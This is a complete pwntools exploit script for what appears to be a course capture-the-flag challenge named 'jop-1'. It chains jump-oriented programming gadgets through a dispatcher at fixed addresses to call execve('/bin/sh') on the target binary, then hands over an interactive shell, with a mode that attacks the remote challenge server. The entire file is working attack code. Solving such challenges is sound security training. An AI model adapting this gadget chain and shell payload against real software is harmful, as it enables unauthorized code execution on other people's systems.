from pwn import *

context.update(
    arch="amd64",
    endian="little",
    log_level="debug",
    os="linux",
    terminal="st"
)

def start(binary):
    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set resolve-heap-via-heuristic on
        b *0x40119d
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-jop-1.chals.io", 443, ssl=True, sni="cse4850-jop-1.chals.io")
    else:
        return process(binary)

def exploit(p,e,r):
    # Dispatcher Gadget: 0x40119d
    # RCX, RDX dispatcher registers

    # Set RDX to dispatcher
    # 0x00000000004011b5 : pop rsp ; mov rdx, 0x40119d ; jmp rdx
    pop_rsp_mov_rdx_dispatcher = p64(0x4011b5)

    # 0x00000000004011e9 : mov rcx, rdx ; jmp rdx
    mov_rcx_rdx = p64(0x4011e9)

    # 0x00000000004011ce : mov eax, 0x3b ; jmp rdx
    mov_rax_exe = p64(0x4011ce)

    # 0x0000000000401201 : mov rsi, 0 ; jmp rdx
    mov_rsi_0 = p64(0x401201)

    # 0x00000000004011dd : mov rdi, rbp ; jmp rdx
    mov_rdi_rbp = p64(0x4011dd)

    # 0x00000000004011f5 : xor rdx, rdx ; jmp rcx
    xor_rdx = p64(0x4011f5)
    syscall = p64(0x401211)

    p.recvuntil(b"Stack: ")
    stack = int(p.recvline(), 16)

    pad = b"/bin/sh\x00" + p64(0) * 2
    pad += mov_rsi_0 + mov_rax_exe
    pad += mov_rdi_rbp
    pad += mov_rcx_rdx + syscall
    pad += b"A" * 40 + p64(stack - 60)

    chain = pop_rsp_mov_rdx_dispatcher + p64(stack-100)

    p.sendline(pad + chain)
    p.interactive()

if __name__ == "__main__":
    file = "./chal.bin"

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p, e, r)
